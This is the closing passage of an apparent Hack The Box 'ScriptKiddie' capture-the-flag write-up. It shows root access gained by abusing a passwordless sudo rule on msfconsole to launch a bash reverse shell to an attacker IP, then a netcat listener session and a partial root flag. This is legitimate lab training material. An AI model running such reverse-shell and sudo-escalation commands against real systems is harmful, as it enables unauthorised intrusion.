    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User pwn may run the following commands on scriptkiddie:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</code></pre></div><p>To exploit this I could just send a reverse shell with <code>-x</code> options on run and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
</code></pre></div><p>And I&rsquo;m rooted</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
$ rlwrap nc -nvlp <span style="color:#ae81ff">9005</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9005</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">43512</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
root@scriptkiddie:/home/pwn# id
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
cut -c-15 /root/root.txt
bf7edd4c58e4420
</code></pre></div><p><img class="img-container" src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  />
</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</a></li>
<li><a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3">https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3</a></li>
<li><a href="http://www.citrucoop.es/jdk-11.0.6/bin/">http://www.citrucoop.es/jdk-11.0.6/bin/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
